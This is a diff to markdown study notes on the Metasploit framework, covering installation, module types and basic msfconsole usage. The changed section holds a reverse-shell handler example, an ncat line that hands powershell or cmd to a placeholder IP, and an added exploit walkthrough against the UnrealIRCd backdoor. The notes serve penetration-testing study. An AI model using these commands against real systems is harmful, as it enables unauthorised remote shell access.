@@ -2,6 +2,8 @@
 
 <h2> Metasploit (cc. Armitage)</h2>
 
+-   The most popular exploitation framework in the industry
+
 <h3> Metasploit Project Intro.</h3>
 
 <i>Refer to -> https://www.metasploit.com/</i>
@@ -10,8 +12,8 @@
 
 <h4> Installation</h4>
 
--   msf: CLI based metasploit framework (Kali Linux default program)
--   Armitage: Java-based GUI front-end for the metasploit framework
+-   msf: CLI based Metasploit framework (Kali Linux default program)
+-   Armitage: Java-based GUI front-end for the Metasploit framework
 
     ```sh
     # metasploit (mfsconsole): Kali Linux default
@@ -22,7 +24,7 @@
 
 <h4> Modules</h4>
 
-1. Elxploits: modules that use payloads
+1. Exploits: modules that use payloads
 2. Auxiliary: port scanners, fuzzers, sniffers, and more
 3. Payloads: code that runs remotely
 4. Encoders: Ensure that payloads make it to their destination intact
@@ -42,6 +44,7 @@
 
 ```sh
 service postgresql start
+msfdb init
 msfconsole
 banner
 help
@@ -66,7 +69,7 @@ exit
 search type:exploit platform:windows flash
 search mysql
 
-# reverse shell connection example
+# Example-1: reverse shell connection to a Windows machine
 use exploit/multi/handler
 show options
 set PAYLOAD generic/shell_reverse_tcp
@@ -78,5 +81,14 @@ exploit
 # if the target is a Windows machine
 >> ncat -nv xx.xx.xx.xx pppp -e powershell or cmd
 
+# Example-2: vulerable IRC server (need to be pre-identified)
+use exploit/unix/irc/unreal_ircd_3182_backdoor
+show payloads
+set PAYLOAD payload/cmd/unix/reverse
+show options
+set LHOST xx.xx.xx.xx
+set RHOST xx.xx.xx.xx
+show options
+exploit
 
 ```
